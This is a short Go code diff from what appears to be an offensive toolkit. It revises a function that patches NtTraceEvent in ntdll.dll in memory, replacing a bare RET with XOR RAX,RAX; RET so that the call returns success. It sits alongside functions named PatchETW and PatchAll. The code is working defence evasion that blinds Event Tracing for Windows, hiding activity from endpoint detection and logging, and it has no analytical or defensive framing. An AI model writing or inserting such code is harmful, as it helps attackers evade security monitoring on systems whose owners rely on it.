@@ -46,14 +46,15 @@ func PatchETW() error {
 	return nil
 }
 
-// PatchNtTraceEvent patches NtTraceEvent in ntdll.dll with a single RET (0xC3).
-// This is a lower-level function used by some ETW providers.
+// PatchNtTraceEvent patches NtTraceEvent in ntdll.dll with XOR RAX,RAX; RET
+// (0x48 0x33 0xC0 0xC3) to return STATUS_SUCCESS. This is a lower-level
+// function used by some ETW providers.
 func PatchNtTraceEvent() error {
 	proc := api.Ntdll.NewProc("NtTraceEvent")
 	if err := proc.Find(); err != nil {
 		return nil // not present
 	}
-	return api.PatchMemory(proc.Addr(), []byte{0xC3})
+	return api.PatchMemory(proc.Addr(), []byte{0x48, 0x33, 0xC0, 0xC3})
 }
 
 // PatchAll applies both PatchETW and PatchNtTraceEvent.
